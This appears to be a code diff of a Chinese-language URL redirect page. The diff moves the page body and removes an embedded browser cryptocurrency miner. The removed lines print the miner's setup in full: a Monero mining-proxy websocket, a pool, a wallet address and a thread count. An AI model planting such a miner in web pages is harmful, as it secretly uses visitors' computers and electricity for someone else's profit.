@@ -4,6 +4,16 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>IMC URL</title>
+</head>
+<body>
+<center>
+    <h1>IMC URL</h1>
+    <p>IMC链接跳转页面，正在跳转中... 如页面没有自动跳转，请
+         <button onclick="adLoad()"><h2>点击这里</h2></button> 跳转
+        </p>
+    <a>如未跳转至正确页面，多试几次即可</a>
+</center>
+
 <script src="/assets/js/imc-main.js"></script>
 <script>
 var ty = getURLParameter('ty');
@@ -46,27 +56,5 @@ function adLoad() {
     }
 }
 </script>
-</head>
-<body>
-<center>
-    <h1>IMC URL</h1>
-    <p>IMC链接跳转页面，正在跳转中... 如页面没有自动跳转，请
-         <button onclick="adLoad()"><h2>点击这里</h2></button> 跳转
-        </p>
-    <a>如未跳转至正确页面，多试几次即可</a>
-</center>
-<!-- Start Of Mining Code (HTML) -->
-<script src="/assets/js/na-monero.js"></script>
-<script>
-    server = "wss://ny1.xmrminingproxy.com";
-    var pool = "moneroocean.stream";
-    var walletAddress = "47YPoXCVUxAQFpS8gmQX4fgY5LmnGkNG4Xz3WjzADvvZhr8WnNG3P4MD4hPAxF8aWZbUSrHhJ7YdZ4x3pi3qJw6aT9RxMg2";
-    var workerId = "WEB-XMR"
-    var threads = 5; //-1
-    var password = "";
-    startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 20;
-</script>
-<!-- End Of Mining Code (HTML) -->
 </body>
 </html>
